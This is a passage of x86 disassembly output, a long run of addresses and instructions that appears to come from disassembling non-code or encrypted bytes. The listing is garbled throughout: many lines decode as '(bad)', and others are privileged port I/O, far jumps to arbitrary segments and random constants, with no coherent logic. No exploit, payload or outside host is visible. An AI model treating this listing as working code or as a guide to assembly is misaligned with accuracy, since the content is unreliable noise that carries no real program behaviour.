  418c3c:	sub    dh,BYTE PTR [esi-0xb]
  418c3f:	aam    0xe2
  418c41:	test   BYTE PTR [ebp-0x5],al
  418c44:	sbb    eax,0xa8ba6959
  418c49:	push   eax
  418c4a:	scas   al,BYTE PTR es:[edi]
  418c4b:	inc    edx
  418c4c:	sub    al,BYTE PTR [edx]
  418c4e:	ret    0x7b1a
  418c51:	(bad)  
  418c52:	jmp    0x9446:0xd6a00c86
  418c59:	xchg   edi,eax
  418c5a:	inc    esi
  418c5b:	cmp    DWORD PTR [ebp-0x12],ecx
  418c5e:	sbb    eax,0x47854849
  418c63:	xchg   esp,eax
  418c64:	outs   dx,BYTE PTR ds:[esi]
  418c66:	mov    cl,0xf2
  418c68:	inc    ebp
  418c69:	clc    
  418c6a:	add    bl,dh
  418c6c:	xchg   esp,eax
  418c6d:	cmp    BYTE PTR [eax],dl
  418c6f:	ret    0xc13c
  418c72:	ins    BYTE PTR es:[edi],dx
  418c73:	stc    
  418c74:	add    al,0xfb
  418c76:	xchg   edx,eax
  418c77:	cmp    DWORD PTR [edx+0x76],esi
  418c7a:	push   ss
  418c7b:	retf   
  418c7c:	mov    edi,0xc061b73a
  418c81:	stos   DWORD PTR es:[edi],eax
  418c82:	mov    bl,0x29
  418c84:	cmp    ebp,DWORD PTR ds:0xfef0586a
  418c8a:	push   es
  418c8b:	inc    edi
  418c8c:	inc    ebx
  418c8d:	fnsave [esi+esi*1-0x52]
  418c91:	xchg   ecx,eax
  418c92:	jg     0x418c49
  418c94:	test   eax,0x6eaac844
  418c99:	lods   al,BYTE PTR ds:[esi]
  418c9a:	ins    DWORD PTR es:[edi],dx
  418c9b:	or     DWORD PTR [ebx-0xa2bcf99],eax
  418ca1:	cdq    
  418ca2:	out    dx,eax
  418ca3:	push   0x2a340f72
  418ca8:	and    al,0x3d
  418caa:	sbb    eax,0xa64a6e6f
  418caf:	xchg   ebp,eax
  418cb0:	je     0x418cda
  418cb2:	push   esi
  418cb3:	fcom   QWORD PTR [eax+0x3f]
  418cb6:	add    edx,DWORD PTR [ecx+ebx*4+0x2cae2a57]
  418cbd:	or     bl,BYTE PTR [ebp-0x2e]
  418cc0:	jns    0x418cb3
  418cc2:	sbb    al,BYTE PTR [edx]
  418cc4:	xor    eax,0xed71e586
  418cc9:	adc    eax,0x8969306b
  418cce:	inc    esp
  418ccf:	mov    BYTE PTR [eax+0x5a],ah
  418cd2:	repnz (bad) 
  418cd4:	outs   dx,BYTE PTR ds:[esi]
  418cd5:	jne    0x418ce9
  418cd7:	and    al,bl
  418cd9:	into   
  418cda:	(bad)  
  418cdb:	jmp    0x418cca
  418cdd:	xchg   esp,eax
  418cde:	rcl    BYTE PTR [esp+ebx*2-0x20817fd3],0x3c
  418ce6:	aas    
  418ce7:	cmp    eax,0x19f3f579
  418cec:	cmp    eax,0xb7bf4d65
  418cf1:	shl    esp,cl
  418cf3:	mov    dh,0xed
  418cf5:	clc    
  418cf6:	cld    
  418cf7:	push   0x34
  418cf9:	data16 or BYTE PTR gs:[edi],bh
  418cfd:	mov    al,ds:0x3cb63dd9
  418d02:	mov    ecx,0xe337fa24
  418d07:	call   0xc2c7:0x7e629762
  418d0e:	mov    dl,0x37
  418d10:	js     0x418cb0
  418d12:	or     BYTE PTR [esi-0x64de7e74],ch
  418d18:	stc    
  418d19:	push   ax
  418d1b:	jae    0x418d66
  418d1d:	mov    fs,eax
  418d1f:	idiv   BYTE PTR [edi+0x63]
  418d22:	test   BYTE PTR [esi+0x68],bh
  418d25:	mov    eax,ss
  418d27:	inc    esi
  418d28:	ss cmp dh,dh
  418d2b:	(bad)  
  418d2d:	add    eax,0xa11f099e
  418d32:	adc    DWORD PTR [edx+0x50],edi
  418d35:	push   es
  418d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d38:	inc    ebp
  418d39:	jmp    0xf95aebaa
  418d3e:	out    dx,eax
  418d3f:	xchg   esi,eax
  418d40:	scas   eax,DWORD PTR es:[edi]
  418d41:	icebp  
  418d42:	xor    BYTE PTR [esi-0x69],dh
  418d45:	pop    eax
  418d46:	jl     0x418dc1
  418d48:	jns    0x418d49
  418d4a:	adc    DWORD PTR [esi],edx
  418d4c:	ins    BYTE PTR es:[edi],dx
  418d4d:	leave  
  418d4e:	test   BYTE PTR [edx+ebp*4],dh
  418d51:	pop    eax
  418d53:	xor    BYTE PTR [eax-0x8c120ea],0x5
  418d5a:	xor    DWORD PTR [esi+0x2da5811b],0xd
  418d61:	and    BYTE PTR [ebx+0x3a6e9940],bl
  418d67:	data16 (bad) 
  418d69:	pop    eax
  418d6a:	icebp  
  418d6b:	mov    dl,0x15
  418d6d:	mov    bh,0xf7
  418d6f:	add    dh,BYTE PTR [eax+edx*2+0x9]
  418d73:	mov    cs:0x6b5f0abf,eax
  418d79:	cmp    eax,0xf226fd68
  418d7e:	loopne 0x418df7
  418d80:	dec    ebp
  418d81:	test   eax,0xb067023e
  418d86:	sar    BYTE PTR [esi+ebp*2-0x2c],0x30
  418d8b:	jns    0x418d25
  418d8d:	test   eax,0xd4c6aa88
  418d92:	and    al,0xb2
  418d94:	cmp    BYTE PTR [ecx],cl
  418d96:	xchg   edx,eax
  418d97:	icebp  
  418d98:	sbb    dh,BYTE PTR [ebp+0x64]
  418d9b:	inc    ecx
  418d9c:	push   es
  418d9d:	add    DWORD PTR [ebx+0x7b5c6d26],eax
  418da3:	cdq    
  418da4:	add    BYTE PTR ds:0x2ba5d92f,0x46
  418dab:	jg     0x418dfb
  418dad:	call   0x13abaf38
  418db2:	cs dec ecx
  418db4:	push   ebx
  418db5:	mov    ds:0x61af1faa,al
  418dba:	pop    eax
  418dbb:	in     al,dx
  418dbc:	fild   WORD PTR [esi+0x31c8b02f]
  418dc2:	mov    bh,0xf
  418dc4:	loopne 0x418d8b
  418dc6:	int3   
  418dc7:	into   
  418dc8:	and    al,0x36
  418dca:	and    BYTE PTR [edx+0x7b],al
  418dcd:	(bad)  
  418dce:	pop    edi
  418dcf:	xor    BYTE PTR [esi+ebx*4-0x16],bh
  418dd3:	neg    BYTE PTR [ebx]
  418dd5:	and    al,0xec
  418dd7:	jbe    0x418d5a
  418dd9:	push   esp
  418dda:	cmp    DWORD PTR [esi],esp
  418ddc:	in     eax,dx
  418ddd:	not    dh
  418ddf:	dec    edi
  418de0:	add    ecx,esp
  418de2:	test   dh,ah
  418de4:	popa   
  418de5:	cmp    BYTE PTR [eax],cl
  418de7:	jmp    0x7e58:0xfef60f84
  418dee:	retf   
  418def:	call   0x61e22e70
  418df4:	call   0x2e4a7be8
  418df9:	cli    
  418dfa:	mov    ch,0x27
  418dfc:	xchg   edx,ebx
  418dfe:	dec    ebx
  418dff:	ins    DWORD PTR es:[edi],dx
  418e00:	xchg   ebp,eax
  418e01:	ja     0x418de2
  418e03:	sahf   
  418e04:	test   BYTE PTR [ebx+0x9],0x35
  418e08:	xor    dl,BYTE PTR [ebx-0x34]
  418e0b:	push   ecx
  418e0c:	xor    ebx,DWORD PTR [ecx+0x58]
  418e0f:	dec    edi
  418e10:	jo     0x418dc8
  418e12:	push   cs
  418e13:	push   0xffffff8a
  418e15:	shr    esp,1
  418e17:	and    ah,BYTE PTR [eax+eiz*2]
  418e1a:	popf   
  418e1b:	or     DWORD PTR [esi-0x53],0x4c
  418e1f:	stos   BYTE PTR es:[edi],al
  418e20:	popf   
  418e21:	inc    edi
  418e22:	or     ebp,DWORD PTR [ebx+0x4f]
  418e25:	xchg   ebx,eax
  418e26:	sti    
  418e27:	jecxz  0x418e29
  418e29:	jo     0x418db5
  418e2b:	mov    ds:0x22c9cd85,eax
  418e30:	mov    eax,ds:0x9373bef6
  418e35:	cmp    ebx,DWORD PTR [esi-0x53]
  418e38:	repnz add dh,dl
  418e3b:	push   edx
  418e3c:	sti    
  418e3d:	fdiv   QWORD PTR [edx+0x477305f]
  418e43:	loope  0x418e1c
  418e45:	or     eax,0xe55f340f
  418e4a:	sub    DWORD PTR [edx],ebp
  418e4c:	out    dx,eax
  418e4d:	int    0xe9
  418e4f:	and    ah,bl
  418e51:	aam    0xaf
  418e53:	sub    ah,BYTE PTR [esi]
  418e55:	(bad)  
  418e56:	pop    edx
  418e57:	xlat   BYTE PTR ds:[ebx]
  418e58:	pop    edx
  418e59:	repz fcomp DWORD PTR [edx+0x45]
  418e5d:	les    eax,FWORD PTR [edi+0x17cda365]
  418e63:	cmp    edx,DWORD PTR [edi]
  418e65:	fadd   QWORD PTR [esi]
  418e67:	push   0x2d8c4c02
  418e6c:	imul   ebp,DWORD PTR [ebp-0x13],0x2f
  418e70:	out    dx,eax
  418e71:	push   es
  418e72:	and    ah,bl
  418e74:	cmp    eax,0x18d1e526
  418e79:	in     eax,dx
  418e7a:	imul   esi,DWORD PTR [ecx+0x5a35f867],0x5636f517
  418e84:	icebp  
  418e85:	mov    ch,0xd5
  418e87:	pushf  
  418e88:	xor    al,0x9e
  418e8a:	jne    0x418e77
  418e8c:	pop    eax
  418e8d:	mov    al,BYTE PTR [ebp-0x23]
  418e90:	add    al,0x3c
  418e92:	adc    edi,DWORD PTR [ecx]
  418e94:	inc    esi
  418e95:	mov    ds:0xd5bb2d1c,al
  418e9a:	mov    ebx,0x8945dfc9
  418e9f:	neg    bl
  418ea1:	adc    edi,DWORD PTR [ebx+0xa2f365b]
  418ea7:	xchg   edx,eax
  418ea8:	pop    esp
  418ea9:	cmp    eax,0xf6a704da
  418eae:	mov    cl,0x98
  418eb0:	test   al,0xdf
  418eb2:	cmp    bh,BYTE PTR [ecx]
  418eb4:	scas   eax,DWORD PTR es:[edi]
  418eb5:	and    BYTE PTR [esi-0xb],0xd9
  418eb9:	rcl    dh,1
  418ebb:	stos   BYTE PTR es:[edi],al
  418ebc:	sub    DWORD PTR [ecx],eax
  418ebe:	sub    ah,cl
  418ec0:	std    
  418ec1:	cmp    DWORD PTR [ecx],edx
  418ec3:	or     ecx,DWORD PTR [esi+0x5f]
  418ec6:	cld    
  418ec7:	pop    edi
  418ec8:	cmp    eax,0xda390aac
  418ecd:	sub    al,0xe
  418ecf:	std    
  418ed0:	sub    BYTE PTR [edi-0x39],ah
  418ed3:	xchg   esp,eax
  418ed4:	test   eax,0x14c3145a
  418ed9:	or     ebp,DWORD PTR [eax]
  418edb:	enter  0x804d,0x34
  418edf:	das    
  418ee0:	jb     0x418f04
  418ee2:	mov    esp,DWORD PTR [ecx+ebx*2+0x3d]
  418ee6:	adc    ah,0xdf
  418ee9:	xchg   ebx,eax
  418eea:	add    BYTE PTR [ebp+ebp*2-0x21baabaa],ah
  418ef1:	mov    eax,ds:0x5f3a0500
  418ef6:	jecxz  0x418f00
  418ef8:	test   al,ah
  418efa:	inc    ebx
  418efb:	inc    ebp
  418efc:	jno    0x418eb1
  418efe:	push   es
  418eff:	sub    eax,0x622e4266
  418f04:	add    esi,DWORD PTR [esi-0x34]
  418f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f08:	jb     0x418ecc
  418f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f0b:	mov    ecx,0x4a9cf33e
  418f10:	mov    eax,0xc13b6647
  418f15:	(bad)  
  418f16:	outs   dx,DWORD PTR ds:[esi]
  418f17:	test   BYTE PTR [ebp+0x111b7f35],0xb3
  418f1e:	loopne 0x418f2a
  418f20:	sub    ch,BYTE PTR [eax]
  418f22:	test   BYTE PTR [edi-0x6ad1dcf6],bh
  418f28:	(bad)  gs:[edi+eiz*1+0x78e85c61]
  418f30:	xchg   ebx,eax
  418f31:	mov    cl,0xf7
  418f33:	adc    cl,0xd2
  418f36:	mov    ds:0x134050ad,eax
  418f3b:	pop    esi
  418f3c:	repnz test BYTE PTR [edi],dh
  418f3f:	nop
  418f40:	adc    DWORD PTR [esi],eax
  418f42:	ror    BYTE PTR ds:0xd86e2a85,0x4c
  418f49:	jne    0x418fc9
  418f4b:	dec    edi
  418f4c:	(bad)
  418f50:	mov    ecx,0xe9c15b12
  418f55:	mov    cl,BYTE PTR [ebp-0x5d]
  418f58:	ss outs dx,DWORD PTR ds:[esi]
  418f5b:	mov    BYTE PTR [edx+0x3f912364],0x55
  418f62:	jg     0x418fc7
  418f64:	(bad)  [edx+0x3b3d9cc5]
  418f6a:	adc    ch,al
  418f6c:	cmp    BYTE PTR [ebx+0x38ae1a46],dl
  418f72:	sub    BYTE PTR [esi+0x6ae88cc6],dh
  418f78:	into   
  418f79:	jb     0x418fc1
  418f7b:	cwde   
  418f7c:	int3   
  418f7d:	je     0x418f6b
  418f7f:	cld    
  418f80:	gs and eax,0x47bf15f3
  418f86:	shl    BYTE PTR [ecx+0x7e9ac16],1
  418f8c:	push   ebx
  418f8d:	ror    DWORD PTR [ecx+0x192ce4a4],0x2
  418f94:	add    ah,bl
  418f96:	stos   BYTE PTR es:[edi],al
  418f97:	adc    eax,DWORD PTR [eax]
  418f99:	pop    esp
  418f9a:	les    ecx,FWORD PTR [ebx+0x3d]
  418f9d:	int3   
  418f9e:	test   edi,ecx
  418fa0:	add    eax,0x733c645c
  418fa5:	js     0x418fbd
  418fa7:	pop    ds
  418fa8:	test   al,0x3d
  418faa:	(bad)  
  418fac:	nop
  418fad:	je     0x41901c
  418faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fb0:	out    dx,al
  418fb1:	or     DWORD PTR [ecx+0x41],ecx
  418fb4:	dec    edi
  418fb5:	push   edi
  418fb6:	mov    esi,0xd7b0f8be
  418fbb:	loopne 0x418f6a
  418fbd:	or     BYTE PTR [ebp-0x7199c7c9],ch
  418fc3:	or     bl,dl
  418fc5:	jno    0x418ffe
  418fc7:	cwde   
  418fc8:	repz fs inc eax
  418fcb:	or     edi,ebx
  418fcd:	cmp    cl,BYTE PTR [edi-0x7a4fd218]
  418fd3:	mov    dh,0xe3
  418fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fd6:	mov    esi,edx
  418fd8:	imul   esp,DWORD PTR [ebx+0x14075c8],0x4c
  418fdf:	arpl   WORD PTR [ecx-0xe],bx
  418fe2:	jo     0x418f75
  418fe4:	jno    0x419021
  418fe6:	stos   DWORD PTR es:[edi],eax
  418fe7:	xchg   DWORD PTR [ebx+0x66ac3c93],esi
  418fed:	jmp    FWORD PTR [ecx+0x162b4309]
  418ff3:	pop    ecx
  418ff4:	in     eax,dx
  418ff5:	test   eax,0xeaad9b61
  418ffa:	xor    DWORD PTR [esi+0x53],edi
  418ffd:	or     ah,BYTE PTR [edx+edi*2]
  419000:	pop    esp
  419001:	push   cs
  419002:	(bad)  
  419003:	cmp    DWORD PTR [edi+0x13],edx
  419006:	fcom   QWORD PTR [ecx-0x4f]
  419009:	jl     0x419021
  41900b:	dec    ecx
  41900c:	scas   eax,DWORD PTR es:[edi]
  41900d:	jmp    0x3f1dad92
  419012:	(bad)  
  419013:	pop    ss
  419014:	mov    bl,0xf1
  419016:	in     al,0x71
  419018:	das    
  419019:	and    edi,esp
  41901b:	aaa    
  41901c:	or     DWORD PTR [ecx+eiz*1],edx
  41901f:	in     eax,dx
  419020:	test   DWORD PTR [eax],ecx
  419022:	lods   al,BYTE PTR ds:[esi]
  419023:	adc    eax,0x5938969d
  419028:	cmp    DWORD PTR [esi-0x6f244f21],0xa21bd4be
  419032:	lahf   
  419033:	call   0x9906:0xfc1f0613
  41903a:	mov    WORD PTR [edi+0x491eccca],cs
  419040:	std    
  419041:	add    bl,BYTE PTR [edx-0x17]
  419044:	cmp    DWORD PTR ds:0xe0e704b5,0xffffff81
  41904b:	xchg   esp,eax
  41904c:	mov    es,WORD PTR [edi+0x2b]
  41904f:	jmp    0x9a35898a
  419054:	sub    al,0x3d
  419056:	or     eax,0x4ce8729d
  41905b:	test   DWORD PTR [eax-0x39eac98d],0x5b433c7a
  419065:	cmp    edx,DWORD PTR [edx]
  419067:	cmp    ecx,DWORD PTR [edi+0x6b]
  41906a:	stos   DWORD PTR es:[edi],eax
  41906b:	int3   
  41906c:	and    DWORD PTR [esi-0x31178a34],ecx
  419072:	out    0x4,al
  419074:	sbb    al,0xc9
  419076:	pop    edi
  419077:	push   eax
  419078:	pop    ebp
  419079:	push   es
  41907a:	in     eax,dx
  41907b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41907c:	xchg   edi,eax
  41907d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907e:	fcom   QWORD PTR [ebx-0xf136eaf]
  419084:	fst    DWORD PTR [edi]
  419086:	scas   al,BYTE PTR es:[edi]
  419087:	lahf   
  419088:	outs   dx,DWORD PTR ds:[esi]
  419089:	pop    edi
  41908a:	xchg   ebx,eax
  41908b:	jb     0x4190db
  41908d:	stc    
  41908e:	or     bl,BYTE PTR [ebp+edx*8-0x23]
  419092:	add    eax,0xee0b4173
  419097:	ret    
  419098:	inc    esi
  419099:	js     0x4190c4
  41909b:	pop    esp
  41909c:	xchg   ebx,eax
  41909d:	xor    DWORD PTR [edx+0x627d8ead],edx
  4190a3:	retf   
  4190a4:	mov    ebp,0x9eba49dc
  4190a9:	dec    edx
  4190aa:	pop    ebx
  4190ab:	aas    
  4190ac:	mov    WORD PTR cs:[ebp-0x299b0044],gs
  4190b3:	add    bl,BYTE PTR [ebp+0x66]
  4190b6:	inc    ecx
  4190b7:	shl    DWORD PTR [edx+0x40f3650f],0xb2
  4190be:	jae    0x41910c
  4190c0:	adc    BYTE PTR [edi],ah
  4190c2:	(bad)  
  4190c3:	cmp    BYTE PTR [ebx],al
  4190c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c6:	or     ebp,DWORD PTR [esi-0x70]
  4190c9:	das    
  4190ca:	stos   BYTE PTR es:[edi],al
  4190cb:	jne    0x419137
  4190cd:	push   ebp
  4190ce:	xchg   esp,eax
  4190cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190d0:	mov    eax,0xbd3e2b43
  4190d5:	mov    cs,ebx
  4190d7:	sbb    al,0x87
  4190d9:	pop    ecx
  4190da:	int3   
  4190db:	mov    dl,dl
  4190dd:	hlt    
  4190de:	jns    0x419062
  4190e0:	(bad)  
  4190e2:	xor    BYTE PTR [edi],bl
  4190e4:	arpl   WORD PTR [ebp-0x4e7aee9a],si
  4190ea:	xchg   ebx,eax
  4190eb:	shl    ebx,1
  4190ed:	outs   dx,BYTE PTR ds:[esi]
  4190ee:	mov    ebp,0x8cd0fa09
  4190f3:	mov    bh,0x7e
  4190f5:	sbb    dh,cl
  4190f7:	jbe    0x41908a
  4190f9:	inc    edx
  4190fa:	in     al,dx
  4190fb:	mov    al,0x63
  4190fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190fe:	(bad)  
  4190ff:	aas    
  419100:	fisub  WORD PTR [ebx+0x4e]
  419103:	cwde   
  419104:	xchg   ecx,eax
  419105:	and    DWORD PTR [edi-0x5],edi
  419108:	pop    ebp
  419109:	push   edx
  41910a:	ins    BYTE PTR es:[edi],dx
  41910b:	hlt    
  41910c:	sub    al,0xc4
  41910e:	adc    dl,dl
  419110:	cli    
  419111:	mov    cl,0xd
  419113:	arpl   WORD PTR [eax-0x6b],dx
  419116:	retf   
  419117:	cs cmp eax,0xeaaf5249
  41911d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41911e:	or     ebx,ebp
  419120:	sbb    al,0xea
  419122:	clc    
  419123:	mov    ecx,0x6f5a52cc
  419128:	fst    st(5)
  41912a:	xchg   ecx,eax
  41912b:	inc    esp
  41912c:	push   ebp
  41912d:	mov    dh,BYTE PTR ds:[edi+0x4a]
  419131:	push   ebx
  419132:	and    cl,bh
  419134:	aas    
  419135:	dec    edi
  419136:	daa    
  419137:	jb     0x419141
  419139:	or     al,0x10
  41913b:	push   ds
  41913c:	pushf  
  41913d:	pop    edx
  41913e:	daa    
  41913f:	xchg   BYTE PTR [edx+eiz*2],cl
  419142:	jno    0x41918f
  419144:	retf   
  419145:	mov    edi,ecx
  419147:	lahf   
  419148:	mov    eax,0x1e9fb420
  41914d:	inc    edx
  41914e:	and    dh,BYTE PTR [edx-0x4f61bf60]
  419154:	rcl    BYTE PTR [ebp*1+0x5eb5ef8b],0x67
  41915c:	lahf   
  41915d:	cmp    ecx,DWORD PTR [ebx]
  41915f:	xlat   BYTE PTR ds:[ebx]
  419160:	add    eax,0x4f28008e
  419165:	out    0xbd,al
  419167:	mov    ebp,0x36ffc739
  41916c:	or     ebx,DWORD PTR cs:[edx]
  41916f:	pop    ss
  419170:	mov    ds:0xbb6f8239,al
  419175:	pop    ds
  419176:	xchg   edx,eax
  419177:	scas   eax,DWORD PTR es:[edi]
  419178:	test   BYTE PTR [ecx+eiz*8+0x366926c1],bh
  41917f:	aad    0xfa
  419181:	hlt    
  419182:	pop    esi
  419183:	daa    
  419184:	xor    eax,0xc985d21
  419189:	cmp    bl,bl
  41918b:	shl    BYTE PTR [esi-0x7f],cl
  41918e:	cmp    al,0x6e
  419190:	dec    ebx
  419191:	and    eax,0x6ed087d6
  419196:	fidivr DWORD PTR [ebp+0x44]
  419199:	xchg   edi,eax
  41919a:	cld    
  41919b:	xchg   ebp,eax
  41919c:	scas   eax,DWORD PTR es:[edi]
  41919d:	int    0x34
  41919f:	mov    ebp,0x3e4b5a7d
  4191a4:	sub    eax,0x54461539
  4191a9:	push   0x2f
  4191ab:	lahf   
  4191ac:	and    al,0xb0
  4191ae:	pop    ebp
  4191af:	lock xor eax,0x38eb4503
  4191b5:	and    ah,BYTE PTR [ebp-0x4a]
  4191b8:	jns    0x41922e
  4191ba:	mov    ds:0x12c8c06,al
  4191bf:	loop   0x4191db
  4191c1:	sbb    eax,0xb800386e
  4191c6:	imul   ebp,DWORD PTR [ebx],0xb3cc3b19
  4191cc:	push   cs
  4191cd:	imul   esi,DWORD PTR [eax+esi*2+0x65bbcf85],0xffffffc5
  4191d5:	sub    al,0x10
  4191d7:	mov    bh,0x5e
  4191d9:	test   bl,ah
  4191db:	lock hlt 
  4191dd:	das    
  4191de:	fldenv [ebp+0x61]
  4191e1:	or     eax,DWORD PTR [ebx-0x7ec3a732]
  4191e7:	push   0x58fb7b7e
  4191ec:	mov    ah,0x6b
  4191ee:	adc    edx,ebx
  4191f0:	cmp    eax,0xcd1d31b7
  4191f5:	xor    ebx,eax
  4191f7:	xchg   edi,eax
  4191f8:	aas    
  4191f9:	xchg   ebx,eax
  4191fa:	mov    ds:0x968032fb,eax
  4191ff:	xor    bh,dh
  419201:	adc    BYTE PTR [ebx-0x536e8dae],ah
  419207:	sub    eax,DWORD PTR [ebx-0x61470e3a]
  41920d:	pop    esi
  41920e:	xchg   esi,eax
  41920f:	sahf   
  419210:	or     BYTE PTR [ebx+0x4e77cbfe],dl
  419216:	call   0x9fdb281c
  41921b:	mov    ebp,DWORD PTR [ecx-0x6b11d41b]
  419221:	sbb    eax,DWORD PTR [ecx-0x69760058]
  419227:	stos   DWORD PTR es:[edi],eax
  419228:	fld    st(2)
  41922a:	ins    BYTE PTR es:[edi],dx
  41922b:	iret   
  41922c:	xchg   edi,eax
  41922d:	jp     0x419284
  41922f:	ins    DWORD PTR es:[edi],dx
  419230:	fnstenv [eax]
  419232:	xor    eax,0xa93b138f
  419237:	pop    edx
  419238:	dec    eax
  419239:	sbb    al,0x9d
  41923b:	sbb    ebx,DWORD PTR [ecx]
  41923d:	sbb    bh,dl
  41923f:	dec    edi
  419240:	pop    esi
  419241:	pop    esi
  419242:	pop    ds
  419243:	adc    ebx,DWORD PTR [ebx]
  419245:	mov    edx,0xb27b165e
  41924a:	xchg   edx,eax
  41924b:	mov    eax,0x2177bc95
  419250:	cwde   
  419251:	push   esp
  419252:	shr    bl,0x1e
  419255:	retf   0xff1e
  419258:	rcl    BYTE PTR [edi+0x7e],cl
  41925b:	adc    eax,0xffffffbf
  41925e:	inc    ebp
  41925f:	sbb    al,0xfd
  419261:	jl     0x4192c3
  419263:	and    edx,DWORD PTR ds:0x3a9e4a30
  419269:	inc    esi
  41926a:	pop    edx
  41926b:	mov    cl,0x4f
  41926d:	xor    DWORD PTR ds:0x6ad5cd5d,eax
  419273:	jmp    0x4192e9
  419275:	add    al,0x6e
  419277:	inc    esp
  419278:	mov    dl,0x4e
  41927a:	mov    ds:0xaa86085f,eax
  41927f:	ja     0x419231
  419281:	ret    0xfa0c
  419284:	inc    ebx
  419285:	nop
  419286:	adc    BYTE PTR [edi+0x162acc3b],dl
  41928c:	into   
  41928d:	and    ebx,ebx
  41928f:	xchg   ebx,eax
  419290:	pop    ds
  419291:	jge    0x4192e3
  419293:	cmc    
  419294:	(bad)  
  419295:	ds dec ebx
  419297:	sbb    ch,dl
  419299:	dec    esp
  41929a:	dec    eax
  41929b:	xchg   ecx,eax
  41929c:	dec    ebx
  41929d:	frstor [eax+0x63]
  4192a0:	pop    ebx
  4192a1:	clc    
  4192a2:	mov    ch,0xb0
  4192a4:	stos   BYTE PTR es:[edi],al
  4192a5:	adc    al,0x80
  4192a7:	inc    esp
  4192a8:	adc    BYTE PTR [ebx],dh
  4192aa:	jb     0x419239
  4192ac:	pop    ebx
  4192ad:	dec    ecx
  4192ae:	inc    eax
  4192af:	dec    esi
  4192b0:	repz pop edx
  4192b2:	test   BYTE PTR [eax-0x1e96dedc],bh
  4192b8:	enter  0x20,0x87
  4192bc:	pop    edi
  4192bd:	int3   
  4192be:	jbe    0x4192ba
  4192c0:	jno    0x41929c
  4192c2:	mov    ds:0xb346db8a,eax
  4192c7:	repz cmc 
  4192c9:	imul   eax,DWORD PTR ds:0x4162be5f,0x75
  4192d0:	sub    BYTE PTR [esi+0xc],dl
  4192d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d4:	fucomp st(5)
  4192d6:	jecxz  0x4192c3
  4192d8:	sbb    BYTE PTR [esi],cl
  4192da:	push   esp
  4192db:	mov    bh,0x54
  4192dd:	cmp    eax,0x126dc08a
  4192e2:	cld    
  4192e3:	and    al,cl
  4192e5:	jle    0x4192a4
  4192e7:	icebp  
  4192e8:	push   eax
  4192e9:	or     ch,BYTE PTR [ebx+0x47]
  4192ec:	add    al,0xe
  4192ee:	ret    0x1540
  4192f1:	jecxz  0x41934c
  4192f3:	retf   0xc805
  4192f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192f7:	sar    BYTE PTR [eax],cl
  4192f9:	pop    esp
  4192fa:	les    edx,FWORD PTR [ebx+0x8]
  4192fd:	bound  edx,QWORD PTR [edx+0x76]
  419300:	and    eax,0xf46268f5
  419305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419306:	int    0x89
  419308:	xchg   edx,eax
  419309:	fmul   st,st(4)
  41930b:	jnp    0x419331
  41930d:	repnz hlt 
  41930f:	loopne 0x4192e7
  419311:	leave  
  419312:	pop    esp
  419313:	fnstenv [ebx-0x6031323c]
  419319:	sbb    DWORD PTR [edi+0x1cc8706],esp
  41931f:	pop    edi
  419320:	and    esi,DWORD PTR [ebp+0x3ae1c4a6]
  419326:	out    dx,al
  419327:	js     0x419330
  419329:	test   al,0x5d
  41932b:	jle    0x419379
  41932d:	or     esi,esp
  41932f:	mov    ds:0x9c2d4662,al
  419334:	add    ch,BYTE PTR [edx+0x74]
  419337:	add    DWORD PTR [edx],0x9
  41933a:	aas    
  41933b:	out    0x87,eax
  41933d:	(bad)  
  41933e:	call   0xd283e0b8
  419343:	mov    DWORD PTR [edx+0x9],eax
  419346:	jecxz  0x4193bd
  419348:	jns    0x419302
  41934a:	mov    DWORD PTR [eax-0x195a4483],edi
  419350:	out    dx,eax
  419351:	adc    ebp,ecx
  419353:	lods   eax,DWORD PTR ds:[esi]
  419354:	dec    ecx
  419355:	(bad)  
  419356:	mov    cl,0xcd
  419358:	jbe    0x4193ad
  41935a:	mov    al,ds:0x189716ec
  41935f:	mov    BYTE PTR [ecx],cl
  419361:	jbe    0x419364
  419363:	fcmovnb st,st(7)
  419365:	jge    0x419300
  419367:	xchg   edi,eax
  419368:	les    eax,FWORD PTR [edi]
  41936a:	sub    eax,0xbcd75407
  41936f:	push   ebx
  419370:	or     ch,cl
  419372:	xchg   ecx,eax
  419373:	xchg   edx,eax
  419374:	sub    BYTE PTR [eax],0xdf
  419377:	sub    ebx,DWORD PTR [ecx+0x65]
  41937a:	ins    BYTE PTR es:[edi],dx
  41937b:	(bad)  
  41937c:	enter  0xba18,0xc3
  419380:	aas    
  419381:	out    dx,al
  419382:	aam    0xea
  419384:	dec    edx
  419385:	push   edx
  419386:	int3   
  419387:	jbe    0x4193fd
  419389:	xchg   edx,eax
  41938a:	adc    ebx,esp
  41938c:	jnp    0x419375
  41938e:	mov    bl,0xe3
  419390:	in     eax,0x5b
  419392:	dec    ebp
  419393:	pop    edx
  419394:	pop    ebx
  419395:	and    BYTE PTR [ebx-0x2c38e291],dl
  41939b:	mov    DWORD PTR [eax-0x35947704],ebx
  4193a1:	cli    
  4193a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193a3:	and    DWORD PTR [ebp-0x5c117741],esi
  4193a9:	fnstenv [ecx]
  4193ab:	mov    ebx,0x21079c92
  4193b0:	xor    bl,dl
  4193b2:	gs push es
  4193b4:	in     al,0x7e
  4193b6:	aaa    
  4193b7:	jmp    0x45a94c5f
  4193bc:	icebp  
  4193bd:	pop    ss
  4193be:	mov    ecx,0x530ec79a
  4193c3:	ss inc esp
  4193c5:	data16 stc 
  4193c7:	dec    eax
  4193c8:	lahf   
  4193c9:	sbb    eax,0xef2e1072
  4193ce:	fimul  WORD PTR [ebp+0x2e]
  4193d1:	push   ebx
